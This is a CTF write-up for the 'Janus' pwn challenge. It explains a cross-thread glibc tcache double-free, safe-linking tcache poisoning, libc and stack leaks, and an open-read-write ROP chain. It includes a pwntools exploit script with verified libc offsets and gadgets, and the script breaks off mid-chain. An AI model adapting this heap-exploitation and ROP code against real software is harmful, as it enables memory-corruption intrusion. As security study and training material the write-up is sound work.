+<h1 id="janus">Janus<a class="headerlink" href="#janus" title="Permanent link">&para;</a></h1>
+<p><span class="nx-badge nx-badge-verified">VERIFIED</span> <span class="nx-chip">PWN</span> <span class="nx-chip">966 pts</span> <span class="nx-chip">id 6</span></p>
+
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Event</td>
+<td>Layer7 CTF 2026</td>
+</tr>
+<tr>
+<td>Category</td>
+<td><code>pwn</code></td>
+</tr>
+<tr>
+<td>Points</td>
+<td><code>966</code></td>
+</tr>
+<tr>
+<td>Solved at</td>
+<td><code>2026-11-21 10:08:53+07:00</code></td>
+</tr>
+<tr>
+<td>Flag</td>
+<td><code>Layer7{0569ee87cf4cff0a6341f0688f8a62eb3dab9e693203b5d8e883978aa85999fa}</code></td>
+</tr>
+<tr>
+<td>Status</td>
+<td><code>VERIFIED</code></td>
+</tr>
+</tbody>
+</table>
+<h1 id="janus_1">Janus<a class="headerlink" href="#janus_1" title="Permanent link">&para;</a></h1>
+<h2 id="tldr">TL;DR<a class="headerlink" href="#tldr" title="Permanent link">&para;</a></h2>
+<p><code>janus</code> is a small "ledger" service with two worker threads, one for each
+<em>side</em> of the ledger. <code>reflect</code> duplicates a ledger entry (same pointer, opposite
+side). Dropping both halves frees the same chunk once through worker 0 and once
+through worker 1. Because glibc's tcache is per-thread, the double-free is not
+detected: the chunk lands in two different tcache lists. Allocating it once on
+each side yields two live entries that reference the same chunk.</p>
+<p>That gives a cross-thread tcache double-free and, with the standard safe-linking
+trick, a fully arbitrary pointer allocation. An unsorted-bin chunk leaks libc;
+reading <code>environ</code> leaks the stack; <code>ror(page0[0], 17) ^ secret</code>-style defenses
+were not needed in the end. Overwriting the saved return address of the command
+loop with a short ORW ROP chain reads <code>/flag</code>.</p>
+<p>The remote glibc is <code>2.39-0ubuntu8.9</code> (not the local <code>2.39-0ubuntu8.12</code>).
+The exact offsets were confirmed by reading remote libc bytes through the
+arbitrary-read primitive.</p>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>$ python3 l7.py chall 6
+{
+  &quot;id&quot;: 6, &quot;title&quot;: &quot;Janus&quot;, &quot;category&quot;: &quot;pwn&quot;, &quot;points&quot;: 966,
+  &quot;connection_info&quot;: &quot;nc 104.105.149.249 18473\nnc 104.105.138.8 18473&quot;,
+  &quot;file_name&quot;: &quot;for_user.zip&quot;
+}
+$ unzip -o for_user.zip
+Archive:  for_user.zip
+  inflating: janus
+  inflating: Dockerfile
+  inflating: flag
+  inflating: README.md
+$ cat README.md
+# janus
+
+Remote: `nc 104.105.149.249 18473`
+
+Local: `docker build -t janus-local .` then `docker run --rm -p 127.0.0.1:1337:1337 janus-local`.
+
+The included flag is fake. The remote service uses a separate real flag.
+$ cat flag
+Layer7{**fake_flag**}
+</code></pre></div>
+<p><code>janus</code> is a stripped PIE with full RELRO, NX, stack canaries and CET
+properties (IBT/SHSTK). No stack leak was present in the binary itself, so the
+plan was to bootstrap arbitrary read/write from the allocator bug.</p>
+<div class="highlight"><pre><span></span><code>$ checksec ./janus
+RELRO: Full RELRO   Stack: Canary found   NX: NX enabled
+PIE: PIE enabled    FORTIFY: Enabled      SHSTK: Enabled   IBT: Enabled
+</code></pre></div>
+<p>The menu:</p>
+<div class="highlight"><pre><span></span><code>JANUS ledger v4
+new SIDE SIZE | reflect ID | turn ID | drop ID | forget ID
+peek ID OFFSET LENGTH | mark ID OFFSET HEX | audit | quit
+&gt;
+</code></pre></div>
+<h2 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h2>
+<p>The service keeps 48 entries of 24 bytes each at <code>.bss+0x5060</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">entry</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w">      </span><span class="c1">// +0x00</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">size</span><span class="p">;</span><span class="w">     </span><span class="c1">// +0x08</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w">  </span><span class="n">side</span><span class="p">;</span><span class="w">     </span><span class="c1">// +0x10  (0 or 1)</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w">  </span><span class="n">used</span><span class="p">;</span><span class="w">     </span><span class="c1">// +0x11</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w">  </span><span class="n">pending</span><span class="p">;</span><span class="w">  </span><span class="c1">// +0x12</span>
+<span class="w">    </span><span class="kt">uint8_t</span><span class="w">  </span><span class="n">link</span><span class="p">;</span><span class="w">     </span><span class="c1">// +0x13</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>Each <em>side</em> is a worker thread. <code>new SIDE SIZE</code> asks worker <code>SIDE</code> to call
+<code>malloc(SIZE)</code>; <code>drop ID</code> asks the entry's side worker to call <code>free(ptr)</code>.
+<code>mallopt(M_ARENA_MAX, 1)</code> is called at startup, so both workers use the main
+arena, but each worker still has its own tcache.</p>
+<p>The relevant commands:</p>
+<ul>
+<li><code>reflect ID</code> clones entry <code>ID</code> into a free slot, shares the pointer, flips the
+  side bit, marks both entries <code>pending</code> and links them to each other.</li>
+<li><code>drop ID</code> frees <code>ptr</code> through the worker selected by <code>entry.side</code> and zeroes
+  the entry.</li>
+<li><code>forget ID</code> zeroes an entry without freeing the pointer (only allowed in the
+  policy-locked state).</li>
+<li><code>peek</code> / <code>mark</code> read / write <code>entry.ptr + offset</code>, bounds-checked against
+  <code>entry.size</code>.</li>
+</ul>
+<h3 id="core-bug-cross-thread-tcache-double-free">Core bug: cross-thread tcache double-free<a class="headerlink" href="#core-bug-cross-thread-tcache-double-free" title="Permanent link">&para;</a></h3>
+<p><code>reflect</code> creates two entries sharing the same chunk with opposite side bits.
+Dropping one half frees the chunk into worker 0's tcache; dropping the other
+half frees the same chunk into worker 1's tcache. The tcache double-free check
+compares <code>e-&gt;key</code> against the <em>current</em> thread's tcache, so the second free is
+not detected. The chunk is now present in two independent tcache lists.</p>
+<p>Allocating the size class on both sides returns the same chunk twice:</p>
+<div class="highlight"><pre><span></span><code>new 0 1024
+reflect 0
+drop 0
+drop 1
+new 0 1024    # returns X from tcache0
+peek 0 0 8    # -&gt; safe-linked next = X &gt;&gt; 12 (heap leak)
+new 1 1024    # returns the same X from tcache1
+</code></pre></div>
+<p>After this, two live entries point to the same chunk. Dropping the side-0 entry
+frees <code>X</code> into tcache0 while the side-1 entry can still <code>mark</code> <code>X</code>. Overwriting
+<code>X-&gt;next</code> with <code>target ^ (X &gt;&gt; 12)</code> plants <code>target</code> in tcache0.</p>
+<p>One subtlety: glibc checks <code>tcache-&gt;counts[idx] &gt; 0</code> before using the bin.
+Freeing a single chunk leaves <code>count == 1</code>, so after popping the poisoned chunk
+the fake target is never returned. The exploit therefore keeps two chunks in
+tcache0: a head chunk <code>Q</code> and the tail chunk <code>P</code>. <code>Q-&gt;next</code> is poisoned, so the
+first <code>new</code> pops <code>Q</code> (count 1) and the second <code>new</code> returns the target.</p>
+<h3 id="leaks">Leaks<a class="headerlink" href="#leaks" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>libc</strong>: allocate a <code>0x500</code>-byte chunk followed by a guard chunk, <code>reflect</code>
+  it, drop one half. The freed chunk goes to the unsorted bin; <code>peek</code> of the
+  mirrored entry reads <code>fd = bk = libc + 0x204b20</code>.</li>
+<li><strong>stack</strong>: with the arbitrary-pointer primitive, allocate an entry whose
+  pointer is <code>libcbase + 0x20bd58 - 0x18</code> (slightly before <code>environ</code>, so
+  tcache_get's <code>e-&gt;key = 0</code> store does not clobber <code>environ</code>), and read
+  <code>environ</code> at offset <code>0x18</code>.</li>
+<li>The address of the command loop's saved return slot is derived from the
+  input line buffer. The buffer is at <code>rsp + 0x5f0</code>; the function frame is
+  <code>0xb38</code> bytes, so the saved return address is <code>buffer + 0x548</code>. For the
+  <code>--serve</code> entry path (<code>argc == 2</code>) this is <code>environ - 0x188</code>; this was
+  verified remotely by reading the stack and checking that the slot contains a
+  PIE return address (<code>PIE + 0x16b8</code>).</li>
+</ul>
+<h3 id="remote-libc-identification">Remote libc identification<a class="headerlink" href="#remote-libc-identification" title="Permanent link">&para;</a></h3>
+<p>Local Ubuntu 24.04 has glibc <code>2.39-0ubuntu8.12</code>, but the remote service runs
+<code>2.39-0ubuntu8.9</code>. The remote version string was read directly through the
+arbitrary read:</p>
+<div class="highlight"><pre><span></span><code>GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.9) stable release version 2.39.
+</code></pre></div>
+<p>The exact <code>libc6_2.39-0ubuntu8.9_amd64.deb</code> was obtained from Launchpad and the
+following offsets were verified byte-for-byte against the remote mapping:</p>
+<div class="highlight"><pre><span></span><code>puts        0x087cc0   MATCH
+open        0x11b3f0   MATCH
+read        0x11bd20   MATCH
+write       0x11c830   MATCH
+exit        0x047ba0   MATCH
+pop rdi;ret 0x10c08d   MATCH
+pop rsi;ret 0x110b7d   MATCH
+pop rbp;ret 0x028a91   MATCH
+pop rdx;leave;ret 0x09828d MATCH
+</code></pre></div>
+<p>The final chain calls <code>open("/flag", 0)</code>, <code>read(3, buf, 0x100)</code>,
+<code>write(1, buf, 0x100)</code>, then <code>exit(0)</code>. Because glibc's <code>open</code> wrapper clobbers
+<code>rdx</code> with the mode argument, the chain sets <code>rdx</code> again before <code>read</code> and
+before <code>write</code> using <code>pop rdx; leave; ret</code> pivots.</p>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>The complete solver is <code>work/6/solve.py</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1"># Janus (Layer7 CTF 2026) exploit</span>
+<span class="c1"># Cross-thread tcache double-free -&gt; tcache poisoning -&gt; arbitrary read/write</span>
+<span class="c1"># -&gt; overwrite saved return address of the command loop -&gt; ORW(&quot;/flag&quot;)</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;error&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+
+<span class="n">BIN</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">abspath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)),</span> <span class="s1">&#39;janus&#39;</span><span class="p">)</span>
+
+<span class="c1"># ---- remote libc: Ubuntu 24.04 glibc 2.39-0ubuntu8.9 ----</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s1">&#39;/tmp/libc89/usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span>
+<span class="n">MAIN_ARENA_LEAK_OFF</span> <span class="o">=</span> <span class="mh">0x204b20</span>      <span class="c1"># leaked ptr = libcbase + this (unsorted bin fd/bk)</span>
+<span class="n">ENVIRON_OFF</span> <span class="o">=</span> <span class="mh">0x20bd58</span>              <span class="c1"># &amp;environ</span>
+<span class="n">OPEN_OFF</span>  <span class="o">=</span> <span class="mh">0x11b3f0</span>
+<span class="n">READ_OFF</span>  <span class="o">=</span> <span class="mh">0x11bd20</span>
+<span class="n">WRITE_OFF</span> <span class="o">=</span> <span class="mh">0x11c830</span>
+<span class="n">EXIT_OFF</span>  <span class="o">=</span> <span class="mh">0x47ba0</span>
+<span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x10c08d</span>          <span class="c1"># pop rdi; ret</span>
+<span class="n">POP_RSI</span> <span class="o">=</span> <span class="mh">0x110b7d</span>          <span class="c1"># pop rsi; ret</span>
+<span class="n">POP_RBP</span> <span class="o">=</span> <span class="mh">0x28a91</span>           <span class="c1"># pop rbp; ret</span>
+<span class="n">POP_RDX_LEAVE</span> <span class="o">=</span> <span class="mh">0x9828d</span>     <span class="c1"># pop rdx; leave; ret</span>
+
+<span class="k">def</span> <span class="nf">load_libc</span><span class="p">():</span>
+    <span class="k">pass</span>
+
+
+<span class="k">class</span> <span class="nc">Janus</span><span class="p">:</span>
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">io</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">io</span> <span class="o">=</span> <span class="n">io</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">s</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">_id</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;ID (\d+)&#39;</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;expected ID, got </span><span class="si">%r</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">r</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">new</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">side</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_id</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;new </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">side</span><span class="p">,</span> <span class="n">size</span><span class="p">)))</span>
+
+    <span class="k">def</span> <span class="nf">reflect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_id</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;reflect </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">drop</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;drop </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;OK&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;drop </span><span class="si">%d</span><span class="s1">: </span><span class="si">%r</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">forget</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">i</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;forget </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;OK&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;forget </span><span class="si">%d</span><span class="s1">: </span><span class="si">%r</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">peek</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">ln</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;peek </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">ln</span><span class="p">))</span>
+        <span class="n">line</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[0-9a-f]*&#39;</span><span class="p">,</span> <span class="n">line</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;peek </span><span class="si">%d</span><span class="s1">: </span><span class="si">%r</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
+        <span class="k">return</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+    <span class="k">def</span> <span class="nf">mark</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;mark </span><span class="si">%d</span><span class="s1"> </span><span class="si">%d</span><span class="s1"> </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">data</span><span class="o">.</span><span class="n">hex</span><span class="p">()))</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;OK&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;mark </span><span class="si">%d</span><span class="s1">: </span><span class="si">%r</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
+
+    <span class="c1"># ----- primitives -----</span>
+    <span class="k">def</span> <span class="nf">leak_libc</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">big</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+        <span class="n">guard</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>          <span class="c1"># keep freed big chunk out of top</span>
+        <span class="n">mir</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">reflect</span><span class="p">(</span><span class="n">big</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drop</span><span class="p">(</span><span class="n">big</span><span class="p">)</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="n">mir</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">forget</span><span class="p">(</span><span class="n">mir</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">d</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">prep_pair</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;double free a chunk across both worker tcache lists, then allocate it</span>
+<span class="sd">        twice -&gt; two live entries sharing one chunk; returns (ida, idb, S=chunk&gt;&gt;12).&quot;&quot;&quot;</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+        <span class="n">b</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">reflect</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drop</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drop</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+        <span class="n">xa</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>             <span class="c1"># pop from tcache of worker 0</span>
+        <span class="n">S</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">peek</span><span class="p">(</span><span class="n">xa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
+        <span class="n">xb</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>             <span class="c1"># pop from tcache of worker 1</span>
+        <span class="k">return</span> <span class="n">xa</span><span class="p">,</span> <span class="n">xb</span><span class="p">,</span> <span class="n">S</span>
+
+    <span class="k">def</span> <span class="nf">arbitrary_ptr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;Return id of a fresh entry whose ptr == target (16-byte aligned,</span>
+<span class="sd">        writable).  Uses a fresh size class for every call.&quot;&quot;&quot;</span>
+        <span class="n">Pa</span><span class="p">,</span> <span class="n">Pb</span><span class="p">,</span> <span class="n">SP</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prep_pair</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+        <span class="n">Qa</span><span class="p">,</span> <span class="n">Qb</span><span class="p">,</span> <span class="n">SQ</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prep_pair</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drop</span><span class="p">(</span><span class="n">Pa</span><span class="p">)</span>                      <span class="c1"># tcache0: [P]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">drop</span><span class="p">(</span><span class="n">Qa</span><span class="p">)</span>                      <span class="c1"># tcache0: [Q -&gt; P]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mark</span><span class="p">(</span><span class="n">Qb</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span> <span class="o">^</span> <span class="n">SQ</span><span class="p">)</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span>  <span class="c1"># Q-&gt;next = target</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>                  <span class="c1"># pops Q, head = target</span>
+        <span class="n">idt</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>            <span class="c1"># pops target</span>
+        <span class="k">return</span> <span class="n">idt</span>
+
+
+<span class="k">def</span> <span class="nf">build_chain</span><span class="p">(</span><span class="n">libcbase</span><span class="p">,</span> <span class="n">S</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;/flag&#39;</span><span class="p">):</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;Return (region_to_mark, BUF, PATH).&quot;&quot;&quot;</span>
+    <span class="n">PIVOT1</span> <span class="o">=</span> <span class="n">S</span> <span class="o">+</span> <span class="mh">0x40</span>
+    <span class="n">PIVOT2</span> <span class="o">=</span> <span class="n">S</span> <span class="o">+</span> <span class="mh">0xa0</span>
+    <span class="n">PIVOT3</span> <span class="o">=</span> <span class="n">S</span> <span class="o">+</span> <span class="mh">0x100</span>
+    <span class="n">PATH</span>   <span class="o">=</span> <span class="n">S</span> <span class="o">+</span> <span class="mh">0x180</span>
+    <span class="n">BUF</span>    <span class="o">=</span> <span class="n">S</span> <span class="o">-</span> <span class="mh">0x300</span>        <span class="c1"># runtime buffer, below the hijacked frame</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;Q&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffffffff</span><span class="p">)</span>
+
+    <span class="c1"># initial return slot: set rdx and pivot into stage 1</span>
+    <span class="n">chain</span>  <span class="o">=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RBP</span><span class="p">)</span>
+    <span class="n">chain</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">PIVOT1</span><span class="p">)</span>
+    <span class="n">chain</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDX_LEAVE</span><span class="p">)</span>
+    <span class="n">chain</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+
+    <span class="c1"># stage 1: open(path, 0); then set rdx again and pivot to stage 2</span>
+    <span class="n">stage1</span>  <span class="o">=</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                                 <span class="c1"># rbp consumed by leave</span>
+    <span class="n">stage1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>
+    <span class="n">stage1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">POP_RSI</span><span class="p">)</span> <span class="o">+</span> <span class="n">q</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">stage1</span> <span class="o">+=</span> <span class="n">q</span><span class="p">(</span><span class="n">libcbase</span> <span class="o">+</span> <span class="n">OPEN_OFF</span><span class="p">)</span>
